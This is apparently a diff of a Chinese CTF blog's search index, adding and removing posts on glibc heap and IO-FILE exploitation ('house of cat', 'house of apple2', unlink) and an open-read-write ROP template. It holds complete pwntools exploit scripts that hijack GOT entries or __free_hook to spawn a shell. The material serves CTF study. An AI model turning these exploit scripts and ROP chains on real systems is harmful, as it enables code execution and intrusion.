+随后当more != 0时会进入__wunderflow。   
+要想调用到_IO_switch_to_wget_mode，需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。
+当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。
+</code></pre>
+<br>
+<br>
+
+<hr>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>IO</tag>
+        <tag>house of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>orw</title>
+    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
+    <content><![CDATA[<hr>
+<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1> <span id="more"></span>        
+
+<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
+<br>
+ 
+<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
+原型: ssize_t read(int fd, void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向存储读取数据的缓冲区的指针。
+count：要读取的字节数。      
+
+2. readv
+原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。  
+
+3. write
+原型: ssize_t write(int fd, const void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向要写入的数据的缓冲区的指针。
+count：要写入的字节数。
+
+4. writev
+原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。
+
+5. open
+原型: int open(const char *pathname, int flags, mode_t mode);
+参数:
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+6. openat
+原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
+参数:
+dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+7. sendfile
+原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
+参数:
+out_fd：目标文件描述符（通常是套接字）。
+in_fd：源文件描述符。
+offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
+count：要发送的字节数。
+</code></pre>
+<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
+<pre><code>o=base+libc.sym[&#39;open&#39;]
+r=base+libc.sym[&#39;read&#39;]
+w=base+libc.sym[&#39;write&#39;]
+orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
+orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
+orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
+</code></pre>
+<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
+ <br>
+ ### <em>sendfile</em>
+ 禁用open、execve、read、write、readv、writev
+
+<pre><code>asm(&#39;&#39;&#39;
+mov rdi,3;                    #openat调用
+mov rdx,0;
+mov r10,0;
+mov rsi,flag;                 #flag地址
+mov rax,257;
+syscall;
+
+mov rdi,0;                    #sendfile调用  
+mov rsi,3;
+mov rdi,1;
+xor rdx,rdx;
+mov r10,0x33;                 #读取大小
+mov rax,40;
+syscall;
+
+
+mov rax,60;                    #exit调用
+xor rdi,rdi;
+syscall;
+&#39;&#39;&#39;
+)
+</code></pre>
+<p>其中指令的表现形式也视具体情况而变动。<br><br><br>比正常情况下少了8字节</p>
+<pre><code>o = libc_base + libc.sym[&#39;open&#39;]
+sendfile = libc_base + libc.sym[&#39;sendfile&#39;]
+orw = p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
+orw+=p64(rdi)+p64(1)+p64(rsi)+p64(3)+p64(rdx)+p64(0)+p64(r10)+p64(r/w_size)+p64(sendfile)
+</code></pre>
+<hr>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>orw</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>unlink</title>
+    <url>/2024/09/26/unlink/</url>
+    <content><![CDATA[<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><span id="more"></span>
+<h2 id="unlink的定义与行为"><a href="#unlink的定义与行为" class="headerlink" title="unlink的定义与行为"></a>unlink的定义与行为</h2><h3 id="1、定义"><a href="#1、定义" class="headerlink" title="1、定义"></a>1、定义</h3><p>unlink是一个宏定义，其主要利用的代码段是   </p>
+<pre><code>#define unlink(AV, P, BK, FD) &#123;                                            
+    FD = P-&gt;fd;								      
+    BK = P-&gt;bk;								      
+    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      
+    malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  
+    else &#123;								      
+        FD-&gt;bk = BK;							      
+        BK-&gt;fd = FD;							      
+        if (!in_smallbin_range (P-&gt;size)				      
+            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      
+        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      
+        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    
+        malloc_printerr (check_action,				      
+                &quot;corrupted double-linked list (not small)&quot;,    
+                P, AV);					      
+            if (FD-&gt;fd_nextsize == NULL) &#123;				      
+                if (P-&gt;fd_nextsize == P)				      
+                FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      
+                else &#123;							      
+                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      
+                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      
+                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      
+                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      
+                &#125;							      
+            &#125; else &#123;							      
+                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      
+                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      
+            &#125;								      
+        &#125;								      
+    &#125;									      
+&#125;    
+</code></pre>
+<p>如上</p>
+<h3 id="2、行为"><a href="#2、行为" class="headerlink" title="2、行为"></a>2、行为</h3><p>unlink的行为顾名思义，是进行的脱链的操作。<br>将一个free状态的chunk，从双向链表中脱离出来。<br><br></p>
+<h2 id="unlink漏洞"><a href="#unlink漏洞" class="headerlink" title="unlink漏洞"></a>unlink漏洞</h2><p>由于脱链后我们控制内存块会发生改变，被unlink的内存块会被移除。<br>所以如果我们可以控制这个被unlink的chunk，改变其fd与bk那我们就可以控制任意的fd内存块。<br>但是由于在后续glibc中增添了新的保护，所以导致其利用受限</p>
+<pre><code>FD-&gt;bk==ptr;
+BK-&gt;fd==ptr;
+       
+</code></pre>
+<p>新增了这两条，绕过的方法也有</p>
+<pre><code>FD-&gt;bk=ptr-0x18
+BK-&gt;fd=ptr-0x10
+</code></pre>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><p>EXP:</p>
+<pre><code>#!/usr/bin/python3
+from pwn import *
+from LibcSearcher import *
+from ctypes import *
+import os
+
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+#ontext(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
+
+#context.terminal = [&quot;xfce4-terminal&quot;, &quot;-e&quot;]
+
+p=process(&quot;./link&quot;)
+#p= remote(&#39;node4.anna.nssctf.cn&#39;,28277)
+libc = ELF(&quot;libc.so.6&quot;)
+elf = ELF(&quot;./link&quot;)
+
+def op():
+    gdb.attach(p)
+    pause()
+
+def inter():
+    p.interactive()
+
+def sa(content,payload):
+    p.sendafter(content,payload)
+
+def sla(content,payload):
+    p.sendlineafter(content,payload)
+
+def uc64():
+    u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))
+
+def uc32():
+    u32(p.recvuntil(b&quot;\\xf7&quot;)[-4:].ljust(4,b&quot;\\x00&quot;))
+
+def exec_fmt(pad):
+    p = process(&quot;./fmt&quot;)
+    p.send(pad)
+    return p.recv()
+def rc(content):
+    p.recvuntil(content)
+
+def l(choose):
+sla(&quot;chooice :&quot;,str(choose))
+
+def add(size):
+l(1)
+sla(&quot;size&quot;,str(size))
+
+def free(index):
+l(2)
+sla(&quot;delete&quot;,str(index))
+
+def show(index):
+l(3)
+sla(&quot;show&quot;,str(index))
+
+def edit(index,content):
+l(4)
+sla(&quot;modify&quot;,str(index))
+sa(&quot;content&quot;,content)
+
+add(0x50)
+add(0x40)
+add(0x90)
+add(0x10)
+
+tar=0x6020C8
+fd=tar-0x18
+bk=tar-0x10
+
+payload=p64(0)+p64(0x41)+p64(fd)+p64(bk)+p64(0)*0x4+p64(0x40)+p64(0xa0)          //伪造被unlink的chunk，并逃逸检查
+edit(1,payload)
+free(2) //触发unlink宏
+
+
+
+payload=b&#39;a&#39;*0x10+p64(elf.got[&#39;free&#39;])
+edit(1,payload)
+show(0)
+free_got=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
+base=free_got-libc.sym[&#39;free&#39;]
+sys=base+libc.sym[&#39;system&#39;]
+print(&quot;base=&quot;,hex(base))
+edit(0,p64(sys))
+edit(3,b&#39;/bin/sh\x00&#39;)
+free(3)
+inter()
+</code></pre>
+<br>
+
+<h3 id="CISCN-2019华南-PWN1"><a href="#CISCN-2019华南-PWN1" class="headerlink" title="[CISCN 2019华南]PWN1"></a>[CISCN 2019华南]PWN1</h3><em>
+tips:    
+这里的got表保护是开启的
+</em>
+EXP:
+
+<pre><code>#!/usr/bin/python3
+from pwn import *
+from LibcSearcher import *
+from ctypes import *
+import os
+
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+#context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
+
+#context.terminal = [&quot;xfce4-terminal&quot;, &quot;-e&quot;]
+
+p=process(&quot;./pw1&quot;)
+#p= remote(&#39;node5.anna.nssctf.cn&#39;,23375)
+libc = ELF(&quot;libc.so.6&quot;)
+elf = ELF(&quot;./pw1&quot;)
+
+def op():
+    gdb.attach(p)
+    pause()
+
+def inter():
+    p.interactive()
+
+def sa(content,payload):
+    p.sendafter(content,payload)
+
+def sla(content,payload):
+    p.sendlineafter(content,payload)
+
+def uc64():
+    u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))
+
+def uc32():
+    u32(p.recvuntil(b&quot;\\xf7&quot;)[-4:].ljust(4,b&quot;\\x00&quot;))
+
+def exec_fmt(pad):
+    p = process(&quot;./fmt&quot;)
+    p.send(pad)
+    return p.recv()
+def rc(content):
+    p.recvuntil(content)
+
+def l(choose):
+sla(&quot;4.show&quot;,str(choose))
+
+def add(index,size,content):
+l(1)
+sla(&quot;index:&quot;,str(index))
+sla(&quot;size:&quot;,str(size))
+sa(&quot;content:&quot;,content)
+
+def free(index):
+l(2)
+sla(&quot;index&quot;,str(index))
+
+def edit(index,content):
+l(3)
+sla(&quot;index:&quot;,str(index))
+sa(&quot;content:&quot;,content)
+
+def show(index):
+l(4)
+sla(&quot;index:&quot;,str(index))
+
+for i in range(1,8):
+add(i,0xf8,b&#39;a&#39;)
+add(32,0xf8,b&#39;b&#39;)
+add(9,0xf8,b&#39;a&#39;)
+add(8,0xf8,b&#39;/bin/sh\x00&#39;)
+add(31,0xf8,b&#39;b&#39;)
+add(30,0xf8,b&#39;a&#39;)
+tar=0x6021E0
+fd=tar-0x18
+bk=tar-0x10
+payload=p64(0)+p64(0xf1)+p64(fd)+p64(bk)
+payload=payload.ljust(0xf0,b&#39;\xff&#39;)+p64(0xf0)                                                          
+for i in range(1,8):
+        free(i)
+edit(32,payload)
+free(9)                                                                                                    //unlink
+free_got=0x400700
+edit(32,p64(elf.got[&#39;puts&#39;])*2+p64(0x6021d8)+p64(0x6021b8)+p64(0)*26+p64(0xfffffffffffff))                //leak libc
+show(30)
+got=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
+base=got-libc.sym[&#39;puts&#39;]
+sys=base+libc.sym[&#39;system&#39;]
+free_hook=base+libc.sym[&#39;__free_hook&#39;]
+print(&quot;base=&quot;,hex(base))
+edit(31,p64(libc.sym[&#39;__free_hook&#39;]+base))                                                               //getshell
+edit(31,p64(sys))
+free(8)
+inter()
+</code></pre>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -1111,541 +1647,6 @@ inter()
         <tag>pwn</tag>
         <tag>CTF</tag>
         <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>unlink</title>
-    <url>/2024/09/11/unlink/</url>
-    <content><![CDATA[<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><span id="more"></span>
-<h2 id="unlink的定义与行为"><a href="#unlink的定义与行为" class="headerlink" title="unlink的定义与行为"></a>unlink的定义与行为</h2><h3 id="1、定义"><a href="#1、定义" class="headerlink" title="1、定义"></a>1、定义</h3><p>unlink是一个宏定义，其主要利用的代码段是   </p>
-<pre><code>#define unlink(AV, P, BK, FD) &#123;                                            
-    FD = P-&gt;fd;								      
-    BK = P-&gt;bk;								      
-    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      
-    malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  
-    else &#123;								      
-        FD-&gt;bk = BK;							      
-        BK-&gt;fd = FD;							      
-        if (!in_smallbin_range (P-&gt;size)				      
-            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      
-        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      
-        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    
-        malloc_printerr (check_action,				      
-                &quot;corrupted double-linked list (not small)&quot;,    
-                P, AV);					      
-            if (FD-&gt;fd_nextsize == NULL) &#123;				      
-                if (P-&gt;fd_nextsize == P)				      
-                FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      
-                else &#123;							      
-                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      
-                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      
-                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      
-                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      
-                &#125;							      
-            &#125; else &#123;							      
-                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      
-                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      
-            &#125;								      
-        &#125;								      
-    &#125;									      
-&#125;    
-</code></pre>
-<p>如上</p>
-<h3 id="2、行为"><a href="#2、行为" class="headerlink" title="2、行为"></a>2、行为</h3><p>unlink的行为顾名思义，是进行的脱链的操作。<br>将一个free状态的chunk，从双向链表中脱离出来。<br><br></p>
-<h2 id="unlink漏洞"><a href="#unlink漏洞" class="headerlink" title="unlink漏洞"></a>unlink漏洞</h2><p>由于脱链后我们控制内存块会发生改变，被unlink的内存块会被移除。<br>所以如果我们可以控制这个被unlink的chunk，改变其fd与bk那我们就可以控制任意的fd内存块。<br>但是由于在后续glibc中增添了新的保护，所以导致其利用受限</p>
-<pre><code>FD-&gt;bk==ptr;
-BK-&gt;fd==ptr;
-       
-</code></pre>
-<p>新增了这两条，绕过的方法也有</p>
-<pre><code>FD-&gt;bk=ptr-0x18
-BK-&gt;fd=ptr-0x10
-</code></pre>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="unlink-1"><a href="#unlink-1" class="headerlink" title="unlink"></a>unlink</h3><p>EXP:</p>
-<pre><code>#!/usr/bin/python3
-from pwn import *
-from LibcSearcher import *
-from ctypes import *
-import os
-
-context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
-#ontext(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
-
-#context.terminal = [&quot;xfce4-terminal&quot;, &quot;-e&quot;]
-
-p=process(&quot;./link&quot;)
-#p= remote(&#39;node4.anna.nssctf.cn&#39;,28277)
-libc = ELF(&quot;libc.so.6&quot;)
-elf = ELF(&quot;./link&quot;)
-
-def op():
-    gdb.attach(p)
-    pause()
-
-def inter():
-    p.interactive()
-
-def sa(content,payload):
-    p.sendafter(content,payload)
-
-def sla(content,payload):
-    p.sendlineafter(content,payload)
-
-def uc64():
-    u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))
-
-def uc32():
-    u32(p.recvuntil(b&quot;\\xf7&quot;)[-4:].ljust(4,b&quot;\\x00&quot;))
-
-def exec_fmt(pad):
-    p = process(&quot;./fmt&quot;)
-    p.send(pad)
-    return p.recv()
-def rc(content):
-    p.recvuntil(content)
-
-def l(choose):
-sla(&quot;chooice :&quot;,str(choose))
-
-def add(size):
-l(1)
-sla(&quot;size&quot;,str(size))
-
-def free(index):
-l(2)
-sla(&quot;delete&quot;,str(index))
-
-def show(index):
-l(3)
-sla(&quot;show&quot;,str(index))
-
-def edit(index,content):
-l(4)
-sla(&quot;modify&quot;,str(index))
-sa(&quot;content&quot;,content)
-
-add(0x50)
-add(0x40)
-add(0x90)
-add(0x10)
-
-tar=0x6020C8
-fd=tar-0x18
-bk=tar-0x10
-
-payload=p64(0)+p64(0x41)+p64(fd)+p64(bk)+p64(0)*0x4+p64(0x40)+p64(0xa0)          //伪造被unlink的chunk，并逃逸检查
-edit(1,payload)
-free(2) //触发unlink宏
-
-
-
-payload=b&#39;a&#39;*0x10+p64(elf.got[&#39;free&#39;])
-edit(1,payload)
-show(0)
-free_got=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
-base=free_got-libc.sym[&#39;free&#39;]
-sys=base+libc.sym[&#39;system&#39;]
-print(&quot;base=&quot;,hex(base))
-edit(0,p64(sys))
-edit(3,b&#39;/bin/sh\x00&#39;)
-free(3)
-inter()
-</code></pre>
-<br>
-
-<h3 id="CISCN-2019华南-PWN1"><a href="#CISCN-2019华南-PWN1" class="headerlink" title="[CISCN 2019华南]PWN1"></a>[CISCN 2019华南]PWN1</h3><em>
-tips:    
-这里的got表保护是开启的
-</em>
-EXP:
-
-<pre><code>#!/usr/bin/python3
-from pwn import *
-from LibcSearcher import *
-from ctypes import *
-import os
-
-context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
-#context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
-
-#context.terminal = [&quot;xfce4-terminal&quot;, &quot;-e&quot;]
-
-p=process(&quot;./pw1&quot;)
-#p= remote(&#39;node5.anna.nssctf.cn&#39;,23375)
-libc = ELF(&quot;libc.so.6&quot;)
-elf = ELF(&quot;./pw1&quot;)
-
-def op():
-    gdb.attach(p)
-    pause()
-
-def inter():
-    p.interactive()
-
-def sa(content,payload):
-    p.sendafter(content,payload)
-
-def sla(content,payload):
-    p.sendlineafter(content,payload)
-
-def uc64():
-    u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))
-
-def uc32():
-    u32(p.recvuntil(b&quot;\\xf7&quot;)[-4:].ljust(4,b&quot;\\x00&quot;))
-
-def exec_fmt(pad):
-    p = process(&quot;./fmt&quot;)
-    p.send(pad)
-    return p.recv()
-def rc(content):
-    p.recvuntil(content)
-
-def l(choose):
-sla(&quot;4.show&quot;,str(choose))
-
-def add(index,size,content):
-l(1)
-sla(&quot;index:&quot;,str(index))
-sla(&quot;size:&quot;,str(size))
-sa(&quot;content:&quot;,content)
-
-def free(index):
-l(2)
-sla(&quot;index&quot;,str(index))
-
-def edit(index,content):
-l(3)
-sla(&quot;index:&quot;,str(index))
-sa(&quot;content:&quot;,content)
-
-def show(index):
-l(4)
-sla(&quot;index:&quot;,str(index))
-
-for i in range(1,8):
-add(i,0xf8,b&#39;a&#39;)
-add(32,0xf8,b&#39;b&#39;)
-add(9,0xf8,b&#39;a&#39;)
-add(8,0xf8,b&#39;/bin/sh\x00&#39;)
-add(31,0xf8,b&#39;b&#39;)
-add(30,0xf8,b&#39;a&#39;)
-tar=0x6021E0
-fd=tar-0x18
-bk=tar-0x10
-payload=p64(0)+p64(0xf1)+p64(fd)+p64(bk)
-payload=payload.ljust(0xf0,b&#39;\xff&#39;)+p64(0xf0)                                                          
-for i in range(1,8):
-        free(i)
-edit(32,payload)
-free(9)                                                                                                    //unlink
-free_got=0x400700
-edit(32,p64(elf.got[&#39;puts&#39;])*2+p64(0x6021d8)+p64(0x6021b8)+p64(0)*26+p64(0xfffffffffffff))                //leak libc
-show(30)
-got=u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
-base=got-libc.sym[&#39;puts&#39;]
-sys=base+libc.sym[&#39;system&#39;]
-free_hook=base+libc.sym[&#39;__free_hook&#39;]
-print(&quot;base=&quot;,hex(base))
-edit(31,p64(libc.sym[&#39;__free_hook&#39;]+base))                                                               //getshell
-edit(31,p64(sys))
-free(8)
-inter()
-</code></pre>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>house of模板</title>
-    <url>/2024/07/25/house%20of/</url>
-    <content><![CDATA[<h1 id="house-of-利用模板及利用条件"><a href="#house-of-利用模板及利用条件" class="headerlink" title="house of 利用模板及利用条件"></a>house of 利用模板及利用条件</h1><span id="more"></span>
-
-<hr>
-<p><em>tips:</em><br>1、于glibc2.34后glibc就移除了hook一类<br>2、_malloc_assert于glibc2.35被移除</p>
-<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>原文链接：<a href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6">https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6</a><br><br><br><em>条件</em><br>glibc版本：任何版本<br>地址：libc_base、heap<br>可触发IO流:FSOP、_malloc_assert或存在可以进入IO链的函数如puts<br><br></p>
-<p><em>调用链： </em><br>1、_IO_wfile_jumps-&gt;_IO_wfile_seekoff-&gt;_IO_switch_to_wget_mode(fp)-&gt;伪造file<br>2、exit() –&gt; __run_exit_handlers –&gt; _IO_cleanup –&gt; _IO_flush_all_lockp –&gt; _IO_wfile_seekoff–&gt; _IO_switch_to_wget_mode –&gt; _IO_switch_to_wget_mode 的 call rax</p>
-<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><pre><code>fake_io_addr=heapbase+0xb00 # 伪造的fake_IO结构体的地址
-next_chain = 0
-fake_IO_FILE=p64(rdi)         #_flags=rdi
-fake_IO_FILE+=p64(0)*7
-fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)
-fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx
-fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)
-fake_IO_FILE = fake_IO_FILE.ljust(0x68, &#39;\x00&#39;)
-fake_IO_FILE += p64(0)  # _chain
-fake_IO_FILE = fake_IO_FILE.ljust(0x88, &#39;\x00&#39;)
-fake_IO_FILE += p64(heapbase+0x1000)  # _lock = a writable address
-fake_IO_FILE = fake_IO_FILE.ljust(0xa0, &#39;\x00&#39;)
-fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr
-fake_IO_FILE = fake_IO_FILE.ljust(0xc0, &#39;\x00&#39;)
-fake_IO_FILE += p64(1) #mode=1
-fake_IO_FILE = fake_IO_FILE.ljust(0xd8, &#39;\x00&#39;)
-fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10
-fake_IO_FILE +=p64(0)*6
-fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
-</code></pre>
-<p>其中fake_io_addr为我们伪造IO_FILE结构体的地址。<br>vtable函数，如果打FSOP则改成IO_wifle_jumps+0x30.<br>rdi、rdx为我们调用函数的参数。  </p>
-<br>
-
-<p>例子orw：  </p>
-<pre><code>Fake_IO_File_Structure = IO_FILE_plus_struct(fake_io_addr)
-Fake_IO_File_Structure._IO_save_base = p64(1)                                           # RCX
-Fake_IO_File_Structure._IO_backup_base = p64(fake_io_addr + 0x120 - 0xa0)               # mov    rdx, qword ptr [rax + 0x20]
-Fake_IO_File_Structure._IO_save_end = p64(setcontext)                                   # call   qword ptr [rax + 0x18]
-Fake_IO_File_Structure._wide_data = p64(fake_io_addr + 0x30)                            # mov    rax, qword ptr [rdi + 0xa0]
-Fake_IO_File_Structure._offset = 0
-Fake_IO_File_Structure._vtable_offset = 0
-Fake_IO_File_Structure._mode = 1
-Fake_IO_File_Structure.vtable = p64(libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;] + 0x30)
-
-Fake_IO_File_Structure = bytes(Fake_IO_File_Structure)
-Fake_IO_File_Structure += p64(0) * 6
-Fake_IO_File_Structure += p64(fake_io_addr + 0x40)                                      # mov    rax, qword ptr [rax + 0xe0]
-Fake_IO_File_Structure = Fake_IO_File_Structure.ljust(0x120, b&#39;\x00&#39;) + p64(fake_io_addr + 0x128) + p64(ret)
-rop = p64(rdi) + p64((fake_io_addr &gt;&gt; 12) &lt;&lt; 12) + p64(rsi) + p64(0x1000) + p64(rdx_r12) + p64(7) * 2 + p64(mprotect) + p64(fake_io_addr + 0x178) + asm(shellcraft.cat(&#39;/flag&#39;))
-
-Fake_IO_File_Structure += rop
-</code></pre>
-<br>
-<br> 
-
-<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p><em>条件</em><br>1、glibc：2.23-2.29<br>2、malloc size无限制，或size可以很大<br>3、至少可以溢出8字节</p>
-<p><em>利用流程：</em></p>
-<pre><code>修改topchunk_size为0xffffffffffffffff
-计算target_size=target_addrtopchunk_addr-0x30
-malloc一个chunk
-getshell
- 
- 
-</code></pre>
-<br>
- 
-<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><p>个人感觉这个house of apple与house of cat不同必须要泄露heap地址，毕竟apple需要两个伪造的地址来控制eip，除非你知道栈地址。<br>具体原理请看:<a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>       </p>
-<br>
-<em>适用版本</em>    
-glibc:2.34-         
-
-<br>
-<em>条件</em>                               
-
-<p>1、能控制_IO_FILE的vtable和_wide_data，或者可以largebinattack<br>2、可以泄露heap和libc地址<br>3、可以执行IO流，exit、malloc assert、返回main函数…….  </p>
-<br>
-<br>
-
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在_IO_2_1_stderr&#x2F;stdout&#x2F;stdin_中，vatable函数在glibc2.24之后，增加了范围检查。<br>但是在_IO_wide_date这个结构体成员变量中，存在一个_wide_vtable成员变量，这个功能与vatble一致,但是与file结构体中的vtable不同的是，在这个_wide_vtable中是没有范围检查的直接调用宏了。<br><br></p>
-<p><em>所以根据上述描述可以将</em><br>    _IO_wide_date覆盖成我们的可控heap地址<br>    vtable覆盖成_IO_wfile_jmups<br>    _wide_vtable劫持为我们的rip        </p>
-<h3 id="共有三种v劫持IO流的方式"><a href="#共有三种v劫持IO流的方式" class="headerlink" title="共有三种v劫持IO流的方式"></a>共有三种v劫持IO流的方式</h3><pre><code>_IO_wfile_overflow
-_IO_wfile_underflow_mmap
-_IO_wdefault_xsgetn
-</code></pre>
-<br>
-
-<h3 id="1、-利用-IO-wfile-overflow"><a href="#1、-利用-IO-wfile-overflow" class="headerlink" title="1、 利用_IO_wfile_overflow"></a>1、 利用_IO_wfile_overflow</h3><p><em>调用链</em>     </p>
-<pre><code>_IO_wfile_overflow
-    _IO_wdoallocbuf
-        _IO_WDOALLOCATE
-            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
-</code></pre>
-<br>
-<em>伪造file及_IO_wide_date_</em>
-
-<pre><code>_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
-vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
-_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
-_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0
-_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
-_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
-_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
-</code></pre>
